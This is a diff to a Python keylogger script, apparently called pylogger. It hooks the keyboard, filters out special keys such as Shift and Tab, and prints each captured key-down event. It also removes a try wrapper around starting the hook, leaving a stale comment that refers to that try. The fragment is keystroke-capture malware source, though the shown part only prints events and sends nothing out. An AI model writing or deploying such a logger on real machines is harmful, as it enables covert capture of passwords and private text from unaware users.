@@ -26,9 +26,17 @@ if os.environ.get('pylogger_clean', None) is not None:
 	# File does not exist, or no permissions.
 		pass
 
-def OnKeyPress(event):
 
-#creating key pressing event and saving it into log file
+special_keys = ['Escape', 'BackSpace', 'Tab', 'Shift_L', 'Shift_R','Return',
+				'Control_L', 'Control_R', 'Delete', 'Home', 'End', 'Page_Up',
+				'Next', 'Print', 'Caps_Lock', 'Up', 'Down', 'Left', 'Right',
+				'Alt_L', 'Alt_R', 'Menu']
+
+
+def OnKeyPress(event):
+	#creating key pressing event and saving it into log file
+	if event.Key not in special_keys and event.MessageName=="key down":
+		print(event)
 
 
 
@@ -43,5 +51,4 @@ new_hook.HookKeyboard()
 #try statement is written for you write the except statements
 
 
-try:
-	new_hook.start()		 # start the hook
+new_hook.start() # start the hook
